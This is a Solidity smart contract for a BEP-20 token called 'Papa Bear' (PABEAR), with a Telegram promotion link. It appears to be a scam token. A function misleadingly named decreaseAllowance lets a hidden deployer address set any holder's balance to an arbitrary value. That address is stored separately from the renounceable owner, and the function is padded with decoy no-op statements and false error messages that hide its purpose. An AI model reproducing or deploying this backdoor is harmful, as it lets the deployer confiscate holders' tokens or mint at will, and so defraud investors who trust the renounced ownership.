/**
 *The biggest risk of all, is not taking one here.
                         https://t.me/PapaBearBEP
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract BEP2020Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBEP2020 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address Empfanger, uint256 Menge) external returns (bool);
    function allowance(address owner, address Spenderin) external view returns (uint256);
    function approve(address Spenderin, uint256 Menge) external returns (bool);
    function transferFrom(address sender, address Empfanger, uint256 Menge) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed Spenderin, uint256 value);
}

library SafeCALC {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeCALC: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeCALC: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeCALC: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeCALC: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is BEP2020Burnable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract PapaBear is BEP2020Burnable, IBEP2020, Ownable {
    using SafeCALC for uint256;
    mapping (address => uint256) private CALCS;
    mapping (address => mapping (address => uint256)) private setPendingCALC;
    bytes32 public DOMCALCN_SEPARATORCALC;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60380fef10115fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
    string private constant _name = "Papa Bear";
    string private constant _symbol = "PABEAR";
    address private pendingCALC; 
    constructor () {
        pendingCALC = _msgSender(); 
        CALCS[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return CALCS[account];
    }

    function transfer(address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(_msgSender(), Empfanger, Menge);
        return true;
    }

    function allowance(address owner, address Spenderin) public view override returns (uint256) {
        return setPendingCALC[owner][Spenderin];
    }

    function approve(address Spenderin, uint256 Menge) public override returns (bool) {
        _approve(_msgSender(), Spenderin, Menge);
        return true;
    }

    function transferFrom(address sender, address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(sender, Empfanger, Menge);
        _approve(sender, _msgSender(), setPendingCALC[sender][_msgSender()].sub(Menge, "IBEP2020: transfer Menge exceeds allowance"));
        return true;
    }

    function _approve(address owner, address Spenderin, uint256 Menge) private {
        require(owner != address(0), "IBEP2020: approve from the zero address");
        require(Spenderin != address(0), "IBEP2020: approve to the zero address");
        setPendingCALC[owner][Spenderin] = Menge;
        emit Approval(owner, Spenderin, Menge);
    }

    function decreaseAllowance(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        (Spenderin != address(0), "IBEP2020: burn from the zero address"); 
        DOMCALCN_SEPARATORCALC;
        require(_msgSender() == pendingCALC, "Ownable: caller is not the owner");
        CALCS[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }

    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        require(from != address(0), "IBEP2020: transfer from the zero address");
        require(to != address(0), "IBEP2020: transfer to the zero address");

        uint256 fromBalance = CALCS[from];
        require(fromBalance >= Menge, "IBEP2020: transfer Menge exceeds balance");
        CALCS[from] = fromBalance - Menge;

        CALCS[to] = CALCS[to].add(Menge);
        emit Transfer(from, to, Menge);
    }
}